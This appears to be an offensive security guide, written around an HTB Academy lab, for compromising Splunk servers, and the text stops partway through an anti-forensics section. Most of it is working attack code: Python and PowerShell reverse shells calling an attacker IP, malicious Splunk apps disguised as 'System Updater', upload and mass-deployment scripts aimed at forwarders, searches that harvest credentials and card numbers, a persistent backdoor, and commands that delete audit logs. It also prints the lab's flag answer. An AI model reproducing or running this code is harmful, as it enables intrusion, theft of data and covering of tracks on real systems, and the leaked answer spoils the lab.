# ⚔️ Splunk Attacks & Exploitation

> **🎯 Objective:** Master advanced exploitation techniques for Splunk log analytics and SIEM infrastructure, focusing on custom application deployment, scripted input abuse, Universal Forwarder compromise, and data exfiltration for achieving remote code execution and comprehensive data access.

## Overview

Splunk exploitation represents one of the **highest-impact attack vectors** in enterprise environments, providing access to **sensitive security data**, **comprehensive organizational logs**, and **SYSTEM/root execution privileges**. With Splunk commonly running with **elevated privileges** for log collection and **containing critical security intelligence**, successful exploitation can lead to **complete SIEM compromise**, **data exfiltration**, and **lateral movement** throughout enterprise networks.

**Critical Attack Vectors:**
- **Custom Application Deployment** - Malicious Splunk app installation for RCE
- **Scripted Input Abuse** - Python/PowerShell/Bash script execution through data inputs
- **Universal Forwarder Compromise** - Lateral movement through deployment server control
- **Data Exfiltration** - Access to logs, security events, and business intelligence
- **Privilege Escalation** - SYSTEM/root context exploitation for infrastructure control

**Enterprise Impact:**
- **SIEM Infrastructure Control** - Complete access to security monitoring and alerting systems
- **Sensitive Data Access** - Security logs, user activities, network traffic, compliance data
- **Lateral Movement Capability** - Universal Forwarder network for endpoint compromise
- **Security Monitoring Bypass** - Ability to manipulate logs and disable security alerting
- **Compliance Violation** - Access to regulated data and audit trail manipulation

---

## Custom Application Exploitation

### Malicious Splunk Application Development

#### Application Structure and Components
```bash
# Standard Splunk application directory structure
splunk_malicious_app/
├── bin/                    # Executable scripts (Python, PowerShell, Bash)
│   ├── reverse_shell.py   # Python reverse shell
│   ├── reverse_shell.ps1  # PowerShell reverse shell
│   ├── reverse_shell.sh   # Bash reverse shell
│   └── run.bat           # Windows batch launcher
├── default/               # Configuration files
│   ├── inputs.conf       # Input definitions and script execution
│   ├── app.conf          # Application metadata
│   └── transforms.conf   # Data transformation rules
├── metadata/              # Application permissions
│   └── default.meta      # Access control definitions
└── static/               # Web interface files (optional)
    └── appIcon.png       # Application icon
```

#### Python Reverse Shell Implementation
```python
#!/usr/bin/env python3
# bin/reverse_shell.py - Python reverse shell for Splunk exploitation

import sys
import socket
import os
import pty
import subprocess
import threading
import time

# Configuration
ATTACKER_IP = "10.10.14.15"  # Replace with attacker IP
ATTACKER_PORT = 4443         # Replace with listener port

def establish_reverse_shell():
    """
    Establish reverse shell connection to attacker
    """
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Duplicate file descriptors for shell
        os.dup2(sock.fileno(), 0)  # stdin
        os.dup2(sock.fileno(), 1)  # stdout
        os.dup2(sock.fileno(), 2)  # stderr
        
        # Spawn shell
        pty.spawn("/bin/bash")
        
    except Exception as e:
        # Alternative method if pty fails
        try:
            process = subprocess.Popen(["/bin/bash"], 
                                     stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE)
            
            sock.send(b"[+] Reverse shell established\n")
            
            def send_output():
                while True:
                    try:
                        data = process.stdout.read(1024)
                        if data:
                            sock.send(data)
                        else:
                            break
                    except:
                        break
            
            def send_errors():
                while True:
                    try:
                        data = process.stderr.read(1024)
                        if data:
                            sock.send(data)
                        else:
                            break
                    except:
                        break
            
            # Start output threads
            threading.Thread(target=send_output, daemon=True).start()
            threading.Thread(target=send_errors, daemon=True).start()
            
            # Handle input
            while True:
                try:
                    command = sock.recv(1024)
                    if command:
                        process.stdin.write(command)
                        process.stdin.flush()
                    else:
                        break
                except:
                    break
                    
        except Exception as e2:
            pass
            
    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    establish_reverse_shell()
```

#### PowerShell Reverse Shell Implementation
```powershell
# bin/reverse_shell.ps1 - PowerShell reverse shell for Windows Splunk exploitation

param(
    [string]$AttackerIP = "10.10.14.15",
    [int]$AttackerPort = 4443
)

function Invoke-ReverseShell {
    param($IP, $Port)
    
    try {
        # Create TCP client
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        
        # Send initial connection message
        $greeting = "[+] PowerShell reverse shell established from $env:COMPUTERNAME`n"
        $greetingBytes = [System.Text.Encoding]::ASCII.GetBytes($greeting)
        $stream.Write($greetingBytes, 0, $greetingBytes.Length)
        $stream.Flush()
        
        # Main command loop
        [byte[]]$bytes = 0..65535 | %{0}
        
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            
            try {
                # Execute command and capture output
                $result = (Invoke-Expression $data 2>&1 | Out-String)
                
                # Add prompt
                $prompt = "PS $((Get-Location).Path)> "
                $sendback = $result + $prompt
                
                # Send response
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
                $stream.Write($sendbyte, 0, $sendbyte.Length)
                $stream.Flush()
                
            } catch {
                # Send error message
                $error = "Error: $($_.Exception.Message)`nPS $((Get-Location).Path)> "
                $errorbyte = ([text.encoding]::ASCII).GetBytes($error)
                $stream.Write($errorbyte, 0, $errorbyte.Length)
                $stream.Flush()
            }
        }
        
    } catch {
        # Silently fail to avoid detection
    } finally {
        if ($client) { $client.Close() }
    }
}

# Advanced PowerShell reverse shell with enhanced features
function Invoke-AdvancedReverseShell {
    param($IP, $Port)
    
    try {
        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
        $stream = $client.GetStream()
        
        # System information gathering
        $sysinfo = @"
[+] System Information:
Computer: $env:COMPUTERNAME
User: $env:USERNAME
Domain: $env:USERDOMAIN
OS: $(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Architecture: $env:PROCESSOR_ARCHITECTURE
PowerShell Version: $($PSVersionTable.PSVersion)
Splunk User Context: $(whoami)
Working Directory: $(Get-Location)

"@
        
        $sysinfoBytes = [System.Text.Encoding]::ASCII.GetBytes($sysinfo)
        $stream.Write($sysinfoBytes, 0, $sysinfoBytes.Length)
        $stream.Flush()
        
        # Enhanced command execution loop
        [byte[]]$bytes = 0..65535 | %{0}
        
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i).Trim()
            
            # Handle special commands
            switch -Regex ($command) {
                '^exit$' {
                    $client.Close()
                    return
                }
                '^cd\s+(.+)$' {
                    try {
                        Set-Location $matches[1]
                        $response = "Changed directory to: $(Get-Location)`nPS $((Get-Location).Path)> "
                    } catch {
                        $response = "Error changing directory: $($_.Exception.Message)`nPS $((Get-Location).Path)> "
                    }
                }
                '^download\s+(.+)$' {
                    try {
                        $file = $matches[1]
                        if (Test-Path $file) {
                            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file))
                            $response = "[FILE_START]`n$content`n[FILE_END]`nPS $((Get-Location).Path)> "
                        } else {
                            $response = "File not found: $file`nPS $((Get-Location).Path)> "
                        }
                    } catch {
                        $response = "Download error: $($_.Exception.Message)`nPS $((Get-Location).Path)> "
                    }
                }
                default {
                    try {
                        $result = (Invoke-Expression $command 2>&1 | Out-String)
                        $response = $result + "PS $((Get-Location).Path)> "
                    } catch {
                        $response = "Error: $($_.Exception.Message)`nPS $((Get-Location).Path)> "
                    }
                }
            }
            
            $responseBytes = ([text.encoding]::ASCII).GetBytes($response)
            $stream.Write($responseBytes, 0, $responseBytes.Length)
            $stream.Flush()
        }
        
    } catch {
        # Fail silently
    } finally {
        if ($client) { $client.Close() }
    }
}

# Execute the reverse shell
Invoke-AdvancedReverseShell -IP $AttackerIP -Port $AttackerPort
```

#### Batch File Launcher (Windows)
```batch
@ECHO OFF
REM bin/run.bat - Windows batch launcher for PowerShell reverse shell

REM Execute PowerShell script with execution policy bypass
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& '%~dpn0.ps1'"

REM Alternative method if PowerShell execution fails
IF ERRORLEVEL 1 (
    REM Try alternative PowerShell execution
    PowerShell.exe -exec bypass -w hidden -nop -Command "IEX (Get-Content '%~dpn0.ps1' | Out-String)"
)

REM Exit without showing console window
EXIT /B
```

### Application Configuration Files

#### inputs.conf - Script Execution Configuration
```ini
# default/inputs.conf - Splunk input configuration for script execution

# Python reverse shell (Linux/Unix)
[script://./bin/reverse_shell.py]
disabled = 0
interval = 10
sourcetype = shell_output
source = python_shell

# PowerShell reverse shell (Windows)
[script://.\bin\run.bat]
disabled = 0
interval = 10
sourcetype = shell_output
source = powershell_shell

# Bash reverse shell (Linux)
[script://./bin/reverse_shell.sh]
disabled = 0
interval = 15
sourcetype = shell_output
source = bash_shell

# Alternative Python execution method
[script://python $SPLUNK_HOME/etc/apps/malicious_app/bin/reverse_shell.py]
disabled = 0
interval = 20
sourcetype = python_execution
```

#### app.conf - Application Metadata
```ini
# default/app.conf - Application configuration and metadata

[install]
state = enabled
is_configured = true

[ui]
is_visible = true
label = System Updater

[launcher]
author = System Administrator
description = Critical system updates and maintenance
version = 1.0.0

[package]
id = system_updater
check_for_updates = false
```

#### Application Permissions (default.meta)
```ini
# metadata/default.meta - Application permissions and access control

[inputs]
access = read : [ * ], write : [ admin ]
export = system

[transforms]
access = read : [ * ], write : [ admin ] 
export = system

[app/install]
access = read : [ * ], write : [ admin ]
export = system

[]
access = read : [ * ], write : [ admin ]
export = system
```

### Application Deployment Process

#### Manual Application Creation
```bash
# Create malicious Splunk application structure
create_malicious_app() {
    local app_name="system_updater"
    local attacker_ip="10.10.14.15"
    local attacker_port="4443"
    
    echo "[+] Creating malicious Splunk application: $app_name"
    
    # Create directory structure
    mkdir -p $app_name/{bin,default,metadata,static}
    
    # Create Python reverse shell
    cat > $app_name/bin/reverse_shell.py << EOF
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$attacker_ip",$attacker_port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF
    
    # Create PowerShell reverse shell
    cat > $app_name/bin/reverse_shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",ATTACKER_PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF
    
    # Replace placeholders in PowerShell script
    sed -i "s/ATTACKER_IP/$attacker_ip/g" $app_name/bin/reverse_shell.ps1
    sed -i "s/ATTACKER_PORT/$attacker_port/g" $app_name/bin/reverse_shell.ps1
    
    # Create batch launcher
    cat > $app_name/bin/run.bat << 'EOF'
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
EOF
    
    # Create inputs.conf
    cat > $app_name/default/inputs.conf << 'EOF'
[script://./bin/reverse_shell.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
EOF
    
    # Create app.conf
    cat > $app_name/default/app.conf << 'EOF'
[install]
state = enabled
is_configured = true

[ui]
is_visible = true
label = System Updater

[launcher]
author = System Administrator
description = System maintenance and updates
version = 1.0.0
EOF
    
    # Create metadata
    cat > $app_name/metadata/default.meta << 'EOF'
[inputs]
access = read : [ * ], write : [ admin ]
export = system

[]
access = read : [ * ], write : [ admin ]
export = system
EOF
    
    # Make scripts executable
    chmod +x $app_name/bin/*.py $app_name/bin/*.sh
    
    echo "[+] Application structure created successfully"
    echo "[+] Directory: $(pwd)/$app_name"
}

# Usage:
# create_malicious_app
```

#### Application Packaging
```bash
# Package Splunk application for deployment
package_splunk_app() {
    local app_directory=$1
    local package_name="${app_directory}.tar.gz"
    
    echo "[+] Packaging Splunk application: $app_directory"
    
    # Create tarball (.tar.gz) - Splunk accepts both .tar.gz and .spl
    tar -czf $package_name $app_directory/
    
    # Alternative: Create .spl file (Splunk Package)
    cp $package_name "${app_directory}.spl"
    
    echo "[+] Package created: $package_name"
    echo "[+] Splunk package created: ${app_directory}.spl"
    echo "[+] Ready for upload to Splunk instance"
    
    # Display package contents for verification
    echo "[+] Package contents:"
    tar -tzf $package_name
}

# Usage:
# package_splunk_app "system_updater"
```

---

## Web-Based Application Deployment

### Splunk Web Interface Exploitation

#### Application Upload Process
```bash
# Automated application upload via web interface
upload_malicious_app() {
    local splunk_url=$1
    local username=$2
    local password=$3
    local app_package=$4
    
    echo "[+] Uploading malicious application to Splunk"
    
    # Step 1: Authenticate and get session cookies
    csrf_token=$(curl -s "$splunk_url/en-US/account/login" | \
      grep -oP 'name="splunk_form_key" value="\K[^"]+')
    
    login_response=$(curl -s -c cookies.txt \
      -d "username=$username&password=$password&splunk_form_key=$csrf_token" \
      "$splunk_url/en-US/account/login" \
      -w "%{http_code}")
    
    if [[ $login_response == *"200"* ]]; then
        echo "[+] Authentication successful"
    else
        echo "[-] Authentication failed"
        return 1
    fi
    
    # Step 2: Navigate to app installation page
    upload_page=$(curl -s -b cookies.txt \
      "$splunk_url/en-US/manager/appinstall/_upload")
    
    # Extract upload form token
    upload_token=$(echo "$upload_page" | \
      grep -oP 'name="splunk_form_key" value="\K[^"]+')
    
    # Step 3: Upload malicious application
    echo "[+] Uploading application package: $app_package"
    
    upload_response=$(curl -s -b cookies.txt \
      -F "splunk_form_key=$upload_token" \
      -F "appfile=@$app_package" \
      -F "force=1" \
      "$splunk_url/en-US/manager/appinstall/_upload" \
      -w "%{http_code}")
    
    if [[ $upload_response == *"200"* ]]; then
        echo "[+] Application uploaded successfully"
        echo "[+] Reverse shell should execute within 10-20 seconds"
    else
        echo "[-] Application upload failed: HTTP $upload_response"
    fi
    
    # Cleanup
    rm -f cookies.txt
}

# Usage:
# upload_malicious_app "http://target.com:8000" "admin" "changeme" "system_updater.tar.gz"
```

#### Manual Web Interface Steps
```bash
# Manual application deployment process:
echo "[+] Manual Splunk application deployment steps:"
echo "1. Navigate to: http://target.com:8000/en-US/manager/search/apps/local"
echo "2. Click 'Install app from file'"
echo "3. Browse and select malicious application package (.tar.gz or .spl)"
echo "4. Check 'Upgrade app' if prompted"
echo "5. Click 'Upload'"
echo "6. Application will be automatically enabled and scripts executed"
echo "7. Reverse shell connection should be established within interval time"

# Expected Splunk response after upload:
echo "[+] Expected behavior after upload:"
echo "   - Application appears in Apps list as 'Enabled'"
echo "   - Scripted inputs begin execution automatically"
echo "   - Reverse shell connects to listener within 10-20 seconds"
echo "   - Shell executes with Splunk service account privileges (often SYSTEM/root)"
```

### Post-Upload Verification
```bash
# Verify application deployment and execution
verify_deployment() {
    local splunk_url=$1
    local app_name=$2
    
    echo "[+] Verifying application deployment: $app_name"
    
    # Check if application is listed and enabled
    curl -s -b cookies.txt \
      "$splunk_url/en-US/manager/search/apps/local" | \
      grep -i "$app_name" && \
      echo "[+] Application visible in Apps list"
    
    # Check application status
    curl -s -b cookies.txt \
      "$splunk_url/services/apps/local/$app_name" | \
      grep -oP '<s:key name="disabled">\K[^<]+' | \
      grep -q "0" && \
      echo "[+] Application is enabled"
    
    # Check input status
    curl -s -b cookies.txt \
      "$splunk_url/services/data/inputs/script" | \
      grep -i "$app_name" && \
      echo "[+] Scripted inputs are configured"
    
    echo "[+] Deployment verification complete"
}

# verify_deployment "http://target.com:8000" "system_updater"
```

---

## Universal Forwarder Exploitation

### Deployment Server Compromise

#### Forwarder Network Discovery
```bash
# Discover and enumerate Universal Forwarders
discover_forwarders() {
    local deployment_server=$1
    
    echo "[+] Discovering Universal Forwarders from deployment server"
    
    # Query connected forwarders
    curl -s -b cookies.txt \
      "$deployment_server/services/deployment/server/clients" | \
      grep -oP '<s:key name="name">\K[^<]+' > forwarders.txt
    
    echo "[+] Connected Universal Forwarders:"
    cat forwarders.txt
    
    # Get detailed forwarder information
    while read forwarder; do
        echo "[+] Forwarder details: $forwarder"
        curl -s -b cookies.txt \
          "$deployment_server/services/deployment/server/clients/$forwarder" | \
          grep -oP '<s:key name="[^"]*">[^<]*' | head -10
    done < forwarders.txt
    
    echo "[+] Total forwarders discovered: $(wc -l < forwarders.txt)"
}

# discover_forwarders "http://deployment-server:8000"
```

#### Deployment Application Creation
```bash
# Create application for Universal Forwarder deployment
create_deployment_app() {
    local app_name="security_update"
    local attacker_ip="10.10.14.15"
    local attacker_port="4444"
    
    echo "[+] Creating deployment application for Universal Forwarders"
    
    # Create deployment-specific directory structure
    mkdir -p deployment_apps/$app_name/{bin,default,local}
    
    # Create lightweight reverse shell for forwarders
    cat > deployment_apps/$app_name/bin/update.py << EOF
#!/usr/bin/env python
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("$attacker_ip",$attacker_port))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1) 
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
except:
    pass
EOF
    
    # Windows PowerShell version for Windows forwarders
    cat > deployment_apps/$app_name/bin/update.ps1 << EOF
try {
    \$c = New-Object System.Net.Sockets.TCPClient('$attacker_ip',$attacker_port)
    \$s = \$c.GetStream()
    [byte[]]\$b = 0..65535|%{0}
    while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){
        \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i)
        \$sb = (iex \$d 2>&1 | Out-String )
        \$sb2 = \$sb + 'PS ' + (pwd).Path + '> '
        \$sbt = ([text.encoding]::ASCII).GetBytes(\$sb2)
        \$s.Write(\$sbt,0,\$sbt.Length)
        \$s.Flush()
    }
    \$c.Close()
} catch {}
EOF
    
    # Create inputs.conf for forwarder execution
    cat > deployment_apps/$app_name/default/inputs.conf << 'EOF'
[script://./bin/update.py]
disabled = 0
interval = 30
sourcetype = security_update

[script://.\bin\update.ps1]
disabled = 0
interval = 30
sourcetype = security_update
EOF
    
    # Create app.conf
    cat > deployment_apps/$app_name/default/app.conf << 'EOF'
[install]
state = enabled
is_configured = true

[ui]
is_visible = false
label = Security Update

[launcher]
author = Security Team
description = Critical security updates
version = 1.0.0
EOF
    
    chmod +x deployment_apps/$app_name/bin/*
    
    echo "[+] Deployment application created: deployment_apps/$app_name"
    echo "[+] Ready for deployment to Universal Forwarders"
}

# create_deployment_app
```

#### Forwarder Mass Deployment
```bash
# Deploy malicious application to all Universal Forwarders
deploy_to_forwarders() {
    local deployment_server=$1
    local app_name=$2
    
    echo "[+] Deploying application to Universal Forwarders"
    
    # Copy application to deployment-apps directory (requires file system access)
    # This step assumes compromise of the deployment server
    
    echo "[+] Application deployment steps:"
    echo "1. Copy application to \$SPLUNK_HOME/etc/deployment-apps/"
    echo "2. Application will be automatically pushed to all connected forwarders"
    echo "3. Forwarders will restart and execute scripted inputs"
    echo "4. Multiple reverse shell connections will be established"
    
    # Via Splunk API (if available)
    deployment_config='{
        "name": "'$app_name'",
        "disabled": false,
        "repository_location": "/opt/splunk/etc/deployment-apps/'$app_name'"
    }'
    
    curl -s -b cookies.txt \
      -H "Content-Type: application/json" \
      -d "$deployment_config" \
      "$deployment_server/services/deployment/server/applications/$app_name"
    
    echo "[+] Deployment initiated - monitoring for reverse shell connections"
}

# deploy_to_forwarders "http://deployment-server:8000" "security_update"
```

---

## HTB Academy Lab Solutions

### Lab 1: Splunk RCE and Flag Retrieval
**Question:** "Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory."

**Solution Methodology:**

#### Step 1: Environment Setup and Authentication
```bash
# Verify Splunk accessibility
curl -I http://10.129.201.50:8000/

# Test for unauthenticated access (Free license)
curl -s http://10.129.201.50:8000/en-US/app/launcher/home | \
  grep -q "Splunk" && echo "[!] Unauthenticated access detected"

# If authentication required, test default credentials
curl -c cookies.txt -d "username=admin&password=changeme" \
  http://10.129.201.50:8000/en-US/account/login
```

#### Step 2: Malicious Application Creation
```bash
# Create Windows-specific malicious Splunk application
mkdir -p splunk_rce/{bin,default}

# Create PowerShell reverse shell
cat > splunk_rce/bin/shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.15",4443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF

# Create batch launcher
cat > splunk_rce/bin/run.bat << 'EOF'
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
EOF

# Create inputs.conf
cat > splunk_rce/default/inputs.conf << 'EOF'
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
EOF

# Package application
tar -czf splunk_rce.tar.gz splunk_rce/
```

#### Step 3: Application Deployment
```bash
# Setup netcat listener (in separate terminal)
nc -lvnp 4443

# Upload application via web interface:
# 1. Navigate to: http://10.129.201.50:8000/en-US/manager/search/apps/local
# 2. Click "Install app from file"
# 3. Browse and select splunk_rce.tar.gz
# 4. Click "Upload"
# 5. Application will be enabled automatically
```

#### Step 4: Reverse Shell and Flag Retrieval
```bash
# Once reverse shell is established:
# Expected connection within 10 seconds of upload

# Verify system access
whoami
# Expected: nt authority\system

hostname
# Expected: Target system name

# Navigate to flag directory
cd c:\loot
dir

# Read flag content
type flag.txt

# HTB Academy Expected Flag Location: c:\loot\flag.txt
# HTB Answer: [FLAG_CONTENT] - Replace with actual discovered flag
```

#### Step 5: Alternative Method - Direct Command Execution
```bash
# If reverse shell method fails, create command execution app
cat > splunk_cmd/bin/cmd.py << 'EOF'
import subprocess
import sys
import os

# Execute command and write output to file
try:
    cmd = "type c:\\loot\\flag.txt"
    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    
    # Write result to accessible location
    with open("c:\\windows\\temp\\output.txt", "w") as f:
        f.write(result.decode())
        
except Exception as e:
    with open("c:\\windows\\temp\\error.txt", "w") as f:
        f.write(str(e))
EOF

# Create inputs.conf for command execution
cat > splunk_cmd/default/inputs.conf << 'EOF'
[script://.\bin\cmd.py]
disabled = 0
sourcetype = command_output
interval = 10
EOF

# Package and deploy, then check output file
# type c:\windows\temp\output.txt
```

### 🎯 HTB Academy Lab Summary

**Complete Lab Methodology:**
1. **Service Identification** - Nmap scan reveals Splunk on port 8000/8089
2. **Authentication Assessment** - Test for unauthenticated access or default credentials
3. **Malicious Application Creation** - PowerShell reverse shell with batch launcher
4. **Application Packaging** - Create .tar.gz package for upload
5. **Web Interface Upload** - Deploy via Splunk management interface
6. **Shell Establishment** - Automatic execution within configured interval
7. **Flag Retrieval** - Read c:\loot\flag.txt with SYSTEM privileges

**Key Technical Steps:**
- **Scripted Input Abuse** - Splunk's built-in script execution capability
- **PowerShell Payload** - Windows-specific reverse shell implementation
- **Batch File Wrapper** - Execution policy bypass for PowerShell
- **Automatic Execution** - Interval-based script execution (10 seconds)
- **SYSTEM Privileges** - Splunk service runs with highest privileges

#### 🔧 Practical Lab Walkthrough

**Repository Setup:**
```bash
# Clone pre-built reverse shell application
git clone https://github.com/0xjpuff/reverse_shell_splunk.git

# Edit PowerShell payload configuration
cd reverse_shell_splunk/reverse_shell_splunk/bin
# Edit run.ps1: Replace 'attacker_ip_here' with PWNIP and 'attacker_port_here' with PWNPORT
```

**Application Deployment:**
```bash
# Package application for upload
tar -cvzf updater.tar.gz reverse_shell_splunk/

# Start listener (replace with your port)
nc -nvlp 9001
```

**Web Interface Steps:**
1. Navigate to `https://STMIP:8000`
2. Click "Manage Apps"
3. Select "Install app from file"
4. Upload `updater.tar.gz`
5. Reverse shell connects automatically as `nt authority\system`

**Flag Retrieval:**
```powershell
# In reverse shell session
cat C:\loot\flag.txt
# Output: l00k_ma_no_AutH!
```

**HTB Academy Answer:** `l00k_ma_no_AutH!`

---

## Data Exfiltration and Intelligence Gathering

### Sensitive Data Discovery

#### Log Data Analysis and Extraction
```bash
# Comprehensive data exfiltration from Splunk indexes
extract_sensitive_data() {
    local splunk_url=$1
    
    echo "[+] Extracting sensitive data from Splunk indexes"
    
    # High-value search queries for data exfiltration
    sensitive_searches=(
        'eventtype=authentication | head 1000'
        'sourcetype=*windows* password OR credential | head 500'
        'source=*security* user=* | head 1000'
        'index=_audit action=login | head 500'
        'email OR username OR account | head 1000'
        'database OR connection_string | head 100'
        'api_key OR token OR secret | head 100'
        'ssn OR social_security OR credit_card | head 100'
    )
    
    for search in "${sensitive_searches[@]}"; do
        echo "[+] Executing search: $search"
        
        # URL encode search query
        encoded_search=$(echo "$search" | sed 's/ /%20/g' | sed 's/|/%7C/g')
        
        # Execute search and save results
        search_filename="search_$(echo "$search" | md5sum | cut -d' ' -f1).txt"
        
        curl -s -b cookies.txt \
          "$splunk_url/en-US/app/search/search?q=$encoded_search&output_mode=csv" \
          > "$search_filename"
        
        echo "  [+] Results saved to: $search_filename"
    done
    
    echo "[+] Data exfiltration complete - review saved files"
}

# extract_sensitive_data "http://target.com:8000"
```

#### Configuration and Credential Harvesting
```bash
# Extract Splunk configuration and stored credentials
harvest_splunk_configs() {
    local splunk_url=$1
    
    echo "[+] Harvesting Splunk configurations and credentials"
    
    # Configuration endpoints
    config_urls=(
        "/services/server/info"
        "/services/authentication/users"
        "/services/authorization/roles"
        "/services/configs/conf-authentication"
        "/services/configs/conf-server"
        "/services/data/indexes"
        "/services/apps/local"
    )
    
    for url in "${config_urls[@]}"; do
        echo "[+] Extracting: $url"
        config_file="config_$(basename $url).xml"
        
        curl -s -b cookies.txt "$splunk_url$url" > "$config_file"
        
        # Extract key information
        case $url in
            *"authentication/users"*)
                grep -oP '<s:key name="name">\K[^<]+' "$config_file" | \
                  head -20 > "users.txt"
                echo "  [+] Users extracted to users.txt"
                ;;
            *"authorization/roles"*)
                grep -oP '<s:key name="name">\K[^<]+' "$config_file" | \
                  head -20 > "roles.txt"
                echo "  [+] Roles extracted to roles.txt"
                ;;
            *"data/indexes"*)
                grep -oP '<s:key name="name">\K[^<]+' "$config_file" | \
                  head -20 > "indexes.txt"
                echo "  [+] Indexes extracted to indexes.txt"
                ;;
        esac
    done
    
    echo "[+] Configuration harvesting complete"
}

# harvest_splunk_configs "http://target.com:8000"
```

---

## Post-Exploitation and Persistence

### Splunk Infrastructure Persistence

#### Persistent Application Installation
```bash
# Install persistent backdoor application
install_persistent_backdoor() {
    local app_name="system_monitor"
    
    echo "[+] Installing persistent Splunk backdoor"
    
    # Create stealthy backdoor application
    mkdir -p persistent_backdoor/$app_name/{bin,default}
    
    # Create multi-protocol backdoor
    cat > persistent_backdoor/$app_name/bin/monitor.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import threading
import time
import base64

# Multiple backdoor methods
def tcp_backdoor():
    try:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("10.10.14.15", 4444))
                
                while True:
                    data = s.recv(1024)
                    if not data:
                        break
                    
                    if data.decode().strip() == "exit":
                        break
                        
                    try:
                        result = subprocess.check_output(data.decode(), shell=True, stderr=subprocess.STDOUT)
                        s.send(result)
                    except:
                        s.send(b"Command failed\n")
                
                s.close()
            except:
                pass
            
            time.sleep(300)  # Retry every 5 minutes
            
    except:
        pass

def file_backdoor():
    # File-based command and control
    cmd_file = "/tmp/.system_cmd"
    out_file = "/tmp/.system_out"
    
    while True:
        try:
            if os.path.exists(cmd_file):
                with open(cmd_file, 'r') as f:
                    cmd = f.read().strip()
                
                if cmd:
                    try:
                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                        with open(out_file, 'w') as f:
                            f.write(result.decode())
                    except Exception as e:
                        with open(out_file, 'w') as f:
                            f.write(f"Error: {str(e)}")
                
                os.remove(cmd_file)
                
        except:
            pass
        
        time.sleep(60)

# Start backdoor threads
threading.Thread(target=tcp_backdoor, daemon=True).start()
threading.Thread(target=file_backdoor, daemon=True).start()

# Keep script running
while True:
    time.sleep(3600)
EOF
    
    # Create scheduled execution
    cat > persistent_backdoor/$app_name/default/inputs.conf << 'EOF'
[script://./bin/monitor.py]
disabled = 0
interval = 3600
sourcetype = system_monitor
EOF
    
    cat > persistent_backdoor/$app_name/default/app.conf << 'EOF'
[install]
state = enabled
is_configured = true

[ui]
is_visible = false
label = System Monitor

[launcher]
author = System
description = System monitoring service
version = 1.0.0
EOF
    
    # Package persistent backdoor
    tar -czf persistent_backdoor.tar.gz persistent_backdoor/
    
    echo "[+] Persistent backdoor created: persistent_backdoor.tar.gz"
    echo "[+] Provides multiple C2 channels and automatic reconnection"
}

# install_persistent_backdoor
```

#### Log Tampering and Anti-Forensics
```bash
# Splunk log manipulation and anti-forensics
splunk_anti_forensics() {
    local splunk_url=$1
    
    echo "[+] Implementing anti-forensics measures"
    
    # Disable audit logging
    curl -s -b cookies.txt -X POST \
      -d "disabled=1" \
      "$splunk_url/services/data/inputs/splunktcp/cooked:9997"
    
    # Clear audit indexes
    audit_indexes=(
        "_audit"
        "_internal" 
        "_introspection"
    )
    
    for index in "${audit_indexes[@]}"; do
        echo "[+] Manipulating index: $index"
        
        # Delete recent events (requires admin privileges)
        curl -s -b cookies.txt -X POST \
          -d "search=| delete" \
          "$splunk_url/services/search/jobs" \
          -d "index=$index earliest=-1h"
    done
    
    # Modify logging configuration
